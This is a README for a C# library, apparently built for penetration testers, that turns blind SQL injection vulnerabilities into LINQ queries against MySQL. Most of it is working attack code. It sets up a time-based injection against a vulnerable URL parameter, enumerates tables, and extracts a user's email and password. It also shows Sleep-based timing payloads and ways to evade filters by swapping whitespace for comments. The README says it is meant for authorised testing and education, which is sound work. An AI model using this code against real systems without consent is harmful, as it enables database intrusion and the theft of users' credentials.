# Execute LINQ queries through SQL Injection vulnerabilities

> The sharpest tool for SQL Injection.

This is a tool for penetration testers to support manual analysis of SQL injection vulnerabilities. It provides a way to query data through a vulnerability using LINQ like the data were in a regular database. Since queries are expressed as expression trees, the translation of them can be fine-tuned in to every detail.

It also serves educational purposes on LINQ, Expression Trees and Query Providers.

**It is not intended to test or attack any target without prior mutual consent.** See Disclaimer below.

## Usage

Set up services:

```csharp
IServiceCollection services = new ServiceCollection();
services.AddLogging(options => options.AddConsole().SetMinimumLevel(LogLevel.Trace));
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseTimeBased(...)
);

IServiceProvider provider = services.BuildServiceProvider();
```

Getting the attack:

```csharp
var injection = provider.GetRequiredService<BlindSqlInjection>();
```

Running queries:

```csharp
// get database name
var database = await injection.Context.GetDatabaseNameAsync();

// find users table
var usersTable = await injection.Context.InformationSchema.Tables
    .Where(t => t.Schema == database)
    .Where(t => t.Name.Like("%user%"))
    .Select(t => t.Name)
    .FirstAsync();

// acquire the e-mail of the first registered user
var email = await injection.Context.Current.GetTable(usersTable)
    .OrderBy(d => d["id"])
    .Select(d => d["email"])
    .FirstAsync(estimatedLength: 20);

// acquire the password
var password = await injection.Context.Current.GetTable(usersTable)
    .OrderBy(d => d["id"])
    .Where(d => d["email"] == email)
    .Select(d => d["password"])
    .FirstAsync(estimatedLength: 40);
```

## Set up an attack

### Time-based blind attacks
You have to implement the function to inject the SQL query and set the initial values for the timing attack.

```csharp
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseTimeBased(new TimeBasedBlindSqlInjectionOptions
    {
        InjectAsync = InjectAsync,
        InjectedWaitTime = TimeSpan.FromMilliseconds(1000),
        SuccessfulTime = TimeSpan.FromMilliseconds(500),
    }
);

static async Task InjectAsync(string sql)
{
    await http.GetAsync($"/vulnerable.php?param={Uri.EscapeUriString(sql)}");
}
```

### Boolean-based attacks

TODO

## The data context

### Current database

You can access the current database from the data context like this:

```csharp
var users = injection.Context.Current.GetTable("users")
    .OrderBy(u => u["email"])
    .Select(u => u["email"])
    .ToListAsync();
```

Since the schema of every database can be different, entities are dynamic. You can access columns by providing their names are string. To differentiate between types, you can use the following functions of `DynamicEntity`:

```csharp
.OrderBy(u => u["email"]) // string
.OrderBy(u => u.String("email")) // string
.OrderBy(u => u.Integer("id")) // int
```

### Another database

You can access any database through the data context by calling `injection.Context.GetDatabase("name")`.

### Information schema

For example, you can list tables names like this:

```csharp
var database = await injection.Context.GetDatabaseNameAsync();
var tables = await injection.Context.InformationSchema.Tables
    .Where(t => t.Schema == database)
    .OrderBy(t => t.Name)
    .Select(t => t.Name)
    .ToListAsync();
```

### MySQL database

TODO

## Functions

You can import MySQL functions:

```csharp
using static MySqlFunctions;
```

And then you can easily access them in a query:

```csharp
.Select(d => If(Ascii(Substring(Database(), 1, 1)).Between(97, 122), NULL, Sleep(1)))
```

## Rendering queries
You can create and register your own SQL writer:

```csharp
services.AddScoped<SqlWriter, CustomSqlWriter>();
```

#### Change quotes for string literals

```cs
class CustomSqlWriter : MySqlWriter
{
    public override void WriteString(string str) => Write($"\"{Escape(str)}\"");
}
```

#### Omit optional white-space

```csharp
class CustomSqlWriter : MySqlWriter
{
    public override void WriteOptionalWhiteSpace() { };
}
```

#### Replace white-space with comments

```csharp
class CustomSqlWriter : MySqlWriter
{
    public override void WriteWhiteSpace() => Write("/**/");
}
```

## Limitations
 - Only MySQL is supported.
 - Translation of advanced queries (joins, group by) are not supported.

## Disclaimer

Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.